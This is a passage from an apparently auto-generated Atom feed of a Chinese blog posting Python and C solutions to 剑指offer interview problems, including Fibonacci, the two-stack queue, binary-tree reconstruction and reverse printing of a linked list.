class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//与斐波拉契一样</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numWays</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>* a = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">100000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">a[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i - <span class="number">1</span>] + a[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。&lt;/p&gt;
&lt;p&gt;答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>07斐波拉契数列</title>
    <link href="http://yoursite.com/2020/02/19/07%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97/"/>
    <id>http://yoursite.com/2020/02/19/07%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97/</id>
    <published>2020-02-19T11:21:12.000Z</published>
    <updated>2020-02-19T11:30:09.535Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项。斐波那契数列的定义如下：</p><p>F(0) = 0,   F(1) = 1<br>F(N) = F(N - 1) + F(N - 2), 其中 N &gt; 1.<br>斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。</p><a id="more"></a><p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 2</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 5</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= n &lt;= 100</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#不能递归，复杂度太高</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        fb=[<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            fb.append((fb[i<span class="number">-1</span>]+fb[i<span class="number">-2</span>])%<span class="number">1000000007</span>)</span><br><span class="line">        <span class="keyword">return</span> fb[n]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非递归 斐波拉契</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>* a = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">1000000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i - <span class="number">1</span>] + a[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项。斐波那契数列的定义如下：&lt;/p&gt;
&lt;p&gt;F(0) = 0,   F(1) = 1&lt;br&gt;F(N) = F(N - 1) + F(N - 2), 其中 N &amp;gt; 1.&lt;br&gt;斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>06两个栈实现队列</title>
    <link href="http://yoursite.com/2020/02/19/06%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/"/>
    <id>http://yoursite.com/2020/02/19/06%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</id>
    <published>2020-02-19T11:19:33.000Z</published>
    <updated>2020-02-19T11:30:07.137Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&quot;CQueue&quot;,&quot;appendTail&quot;,&quot;deleteHead&quot;,&quot;deleteHead&quot;]</span><br><span class="line">[[],[3],[],[]]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[null,null,3,-1]</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&quot;CQueue&quot;,&quot;deleteHead&quot;,&quot;appendTail&quot;,&quot;appendTail&quot;,&quot;deleteHead&quot;,&quot;deleteHead&quot;]</span><br><span class="line">[[],[],[5],[2],[],[]]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[null,-1,null,null,5,2]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= values &lt;= 10000</code></li><li><code>最多会对 appendTail、deleteHead 进行 10000 次调用</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一个栈用于入队，另一个栈将前一个栈倒序后再pop即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CQueue</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.instack=[]</span><br><span class="line">        self.outstack=[]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">appendTail</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type value: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.instack.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteHead</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#第一次删除时执行栈倒转，后面不用再执行了</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.outstack:</span><br><span class="line">            <span class="keyword">while</span> self.instack:</span><br><span class="line">                self.outstack.append(self.instack.pop())</span><br><span class="line">        <span class="keyword">if</span> self.outstack:</span><br><span class="line">            <span class="keyword">return</span> self.outstack.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span>* inStack;</span><br><span class="line"><span class="keyword">int</span> intop;</span><br><span class="line"><span class="keyword">int</span>* outStack;</span><br><span class="line"><span class="keyword">int</span> outtop;</span><br><span class="line">&#125;CQueue;</span><br><span class="line"></span><br><span class="line"><span class="function">CQueue* <span class="title">cQueueCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CQueue* obj = (CQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CQueue));</span><br><span class="line">obj-&gt;inStack = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">obj-&gt;intop = <span class="number">-1</span>;</span><br><span class="line">obj-&gt;outStack = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">obj-&gt;outtop = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cQueueAppendTail</span><span class="params">(CQueue* obj, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">obj-&gt;inStack[++obj-&gt;intop] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cQueueDeleteHead</span><span class="params">(CQueue* obj)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (obj-&gt;intop == <span class="number">-1</span> &amp;&amp; obj-&gt;outtop == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj-&gt;outtop == <span class="number">-1</span>)<span class="comment">//第一次删除时执行栈倒转，后面不用再执行了</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (obj-&gt;intop &gt; <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">obj-&gt;outStack[++obj-&gt;outtop] = obj-&gt;inStack[obj-&gt;intop--];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> obj-&gt;outStack[obj-&gt;outtop--];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cQueueFree</span><span class="params">(CQueue* obj)</span> </span>&#123;</span><br><span class="line"><span class="built_in">free</span>(obj-&gt;inStack);</span><br><span class="line">obj-&gt;inStack = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(obj-&gt;outStack);</span><br><span class="line">obj-&gt;outStack = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>05重建二叉树</title>
    <link href="http://yoursite.com/2020/02/18/05%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://yoursite.com/2020/02/18/05%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2020-02-18T10:03:45.000Z</published>
    <updated>2020-02-19T11:17:13.974Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>输入某二叉树的前序遍历和中序遍历的结果，请重建该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。</p><a id="more"></a><p><strong>例如：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">前序遍历 preorder &#x3D; [3,9,20,15,7]</span><br><span class="line">中序遍历 inorder &#x3D; [9,3,15,20,7]</span><br><span class="line">返回如下的二叉树：</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line">   &#x2F; \</span><br><span class="line">  9  20</span><br><span class="line">      &#x2F;  \</span><br><span class="line">    15   7</span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><ul><li><code>0 &lt;= 节点个数 &lt;= 5000</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据前序和中序建树，首先前序第一个元素为根，按这个根找到中序的索引，根据索引将中序切分成两个，前序就依次往后进行递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildTree</span><span class="params">(self, preorder: List[int], inorder: List[int])</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="keyword">if</span> len(inorder) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        root = TreeNode(preorder[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 找中序根节点索引下标，将树拆开</span></span><br><span class="line">        idx = inorder.index(preorder[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 左子树</span></span><br><span class="line">        root.left = self.buildTree(preorder[<span class="number">1</span>:idx+<span class="number">1</span>], inorder[:idx])</span><br><span class="line">        <span class="comment"># 右子树</span></span><br><span class="line">        root.right = self.buildTree(preorder[idx+<span class="number">1</span>:], inorder[idx+<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct TreeNode* <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>* preorder, <span class="keyword">int</span> preorderSize, <span class="keyword">int</span>* inorder, <span class="keyword">int</span> inorderSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (preorder == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">root</span> = (<span class="title">struct</span> <span class="title">TreeNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">TreeNode</span>));</span></span><br><span class="line">root-&gt;val = preorder[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//找中序下标</span></span><br><span class="line"><span class="keyword">while</span> (index &lt; inorderSize&amp;&amp;inorder[index] != preorder[<span class="number">0</span>])</span><br><span class="line">&#123;</span><br><span class="line">index++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拆分左右子树进行递归</span></span><br><span class="line">root-&gt;left = buildTree(preorder + <span class="number">1</span>, index, inorder, index);</span><br><span class="line">root-&gt;right = buildTree(preorder + <span class="number">1</span> + index, preorderSize - (index + <span class="number">1</span>), inorder + index + <span class="number">1</span>, inorderSize - (index + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;输入某二叉树的前序遍历和中序遍历的结果，请重建该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>04从尾到头打印链表</title>
    <link href="http://yoursite.com/2020/02/18/04%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/"/>
    <id>http://yoursite.com/2020/02/18/04%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/</id>
    <published>2020-02-18T10:03:02.000Z</published>
    <updated>2020-02-19T11:16:29.440Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。</p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head &#x3D; [1,3,2]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2,3,1]</span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><ul><li><code>0 &lt;= 链表长度 &lt;= 10000</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将链表放到列表中，列表从后往前放到新的列表中。尽量不使用reverse</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePrint</span><span class="params">(self, head:ListNode)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        sc=[]</span><br><span class="line">        result=[]</span><br><span class="line">        hd=head</span><br><span class="line">        <span class="keyword">while</span> hd:</span><br><span class="line">            sc.append(hd.val)</span><br><span class="line">            hd=hd.next</span><br><span class="line">        <span class="keyword">while</span> sc:</span><br><span class="line">            result.append(sc.pop(<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">reversePrint</span><span class="params">(struct ListNode* head, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">hd</span> = <span class="title">head</span>;</span></span><br><span class="line"><span class="keyword">int</span>* ret = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">memset</span>(ret, <span class="number">0</span>, <span class="number">10000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//将链表转为数组</span></span><br><span class="line"><span class="keyword">while</span> (hd)</span><br><span class="line">&#123;</span><br><span class="line">ret[index++] = hd-&gt;val;</span><br><span class="line">hd = hd-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//数组前后调换</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">ceil</span>(index/<span class="number">2</span>) ; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = ret[i];</span><br><span class="line">ret[i] = ret[index - i - <span class="number">1</span>];</span><br><span class="line">ret[index - i - <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">*returnSize = index;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>03替换空格</title>
    <link href="http://yoursite.com/2020/02/18/03%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/"/>
    <id>http://yoursite.com/2020/02/18/03%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</id>
    <published>2020-02-18T10:02:24.000Z</published>
    <updated>2020-02-19T11:15:15.583Z</updated>
    
